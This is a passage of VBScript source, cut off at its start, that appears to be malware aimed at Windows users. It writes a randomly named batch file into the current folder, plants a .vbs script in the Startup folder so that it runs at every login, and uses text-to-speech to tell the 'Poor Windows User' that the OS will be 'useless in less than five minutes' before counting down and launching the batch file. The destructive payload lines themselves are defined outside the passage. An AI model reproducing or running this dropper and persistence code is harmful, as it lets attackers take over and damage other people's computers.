j = e & chr(34) & n & chr(34) & f & chr(34) & h & chr(34) & o
p = "shell.Run curDir & "
q = "\h2a3C39k124.bat"
r = p & chr(34) & q & chr(34)
v = "Set sapi = CreateObject("
vv = "sapi.spvoice"
vvv = v & chr(34) & vv & chr(34) & o
xxx = "wscript.sleep 60000"
yyy = "msg = " & chr(34) & "Poor Windows User. Leave the control of this computer, or the OS will be useless in less than five minutes" & chr(34)
zzz = "sapi.Speak msg"
yyyy = "msg2 = " & chr(34) & "five, four, three, two, one. Enjoy!" & chr(34)
zzzz = "sapi.Speak msg2"

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (curDir & "\h2a3C39k124.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(a)

objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & curDir & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "h2a3C39k124" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "bat"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next

wscript.sleep 50
set objFSO = nothing


Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile _
    (startupFolder & "\t1e9m9p6s3a0m8.txt", ForAppending, True)

wscript.sleep 100

objTextFile.WriteLine(vvv)
objTextFile.WriteLine(xxx)
objTextFile.WriteLine(yyy)
objTextFile.WriteLine(zzz)
objTextFile.WriteLine(b6)
objTextFile.WriteLine(b5)
objTextFile.WriteLine(b4)
objTextFile.WriteLine(b3)
objTextFile.WriteLine(b2)
objTextFile.WriteLine(b1)
objTextFile.WriteLine(y)
objTextFile.WriteLine(d)
objTextFile.WriteLine(j)
objTextFile.WriteLine(x)
objTextFile.WriteLine(u)
objTextFile.WriteLine(yyyy)
objTextFile.WriteLine(zzzz)
objTextFile.WriteLine(r)
objTextFile.Close

wscript.sleep 50

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set FileList = objWMIService.ExecQuery _
    ("ASSOCIATORS OF {Win32_Directory.Name='" & startupFolder & "'} Where " _
        & "ResultClass = CIM_DataFile")

For Each objFile In FileList
    If objFile.Extension = "txt" Then
	If objFile.FileName = "t1e9m9p6s3a0m8" Then
        strNewName = objFile.Drive & objFile.Path & _
            objFile.FileName & "." & "vbs"
        errResult = objFile.Rename(strNewName)
	End If
    End If
Next
wscript.quit
End If

End If